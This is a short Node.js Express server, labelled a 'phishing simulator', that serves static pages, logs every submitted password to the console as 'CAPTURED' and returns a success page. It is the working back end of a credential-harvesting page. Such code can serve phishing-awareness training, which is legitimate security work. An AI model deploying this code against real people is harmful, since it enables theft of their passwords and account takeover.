// same as before
const express = require('express');
const bodyParser = require('body-parser');
const app = express();
const port = 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('.'));

app.post('/submit', (req, res) => {
  const password = req.body.password;
  console.log(`[⚠️ CAPTURED] Password: ${password}`);
  res.sendFile(__dirname + '/success.html'); // return success screen
});

app.listen(port, () => {
  console.log(`🔥 Phishing simulator running at http://localhost:${port}`);
});